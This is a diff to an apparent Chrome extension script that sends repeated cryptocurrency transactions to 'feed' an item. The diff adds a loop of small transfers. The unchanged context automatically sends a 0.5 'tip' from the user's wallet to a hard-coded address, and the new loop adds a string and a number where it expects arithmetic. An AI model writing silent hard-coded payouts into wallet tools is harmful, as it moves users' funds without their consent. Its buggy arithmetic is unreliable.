@@ -71,6 +71,9 @@ chrome.extension.onRequest.addListener(
             const id = request.id;
             var num = limit.toFixed(0);
             const idNum = Number('0.' + id)
+            function sleep(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms))
+            }
             if (mode == "quick") {
                 if (num + idNum > limit) {
                     num = num - 1 + idNum
@@ -81,6 +84,17 @@ chrome.extension.onRequest.addListener(
                     try {
                         const Transacation = await sendTransacation(wallet, to_address, num)
                         console.log(Transacation)
+                        await sleep(1000)
+                        console.log("ID", id, "需要喂养", limit, ((limit - num) / idNum).toFixed(0) + "次")
+                        for (i = num + idNum; i < limit; i += idNum) {
+                            try {
+                                const Transacation = await sendTransacation(wallet, to_address, idNum)
+                                console.log(Transacation)
+                                await sleep(1000)
+                            } catch (err) {
+                                throw err
+                            }
+                        }
                         // 打赏
                         sendTransacation(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
                     } catch (err) {
@@ -91,9 +105,7 @@ chrome.extension.onRequest.addListener(
 
             } else {
                 console.log("ID", id, "需要喂养", limit, (limit / idNum).toFixed(0) + "次")
-                function sleep(ms) {
-                    return new Promise(resolve => setTimeout(resolve, ms))
-                }
+
                 const looper = async function () {
                     for (i = idNum; i < limit; i += idNum) {
                         try {
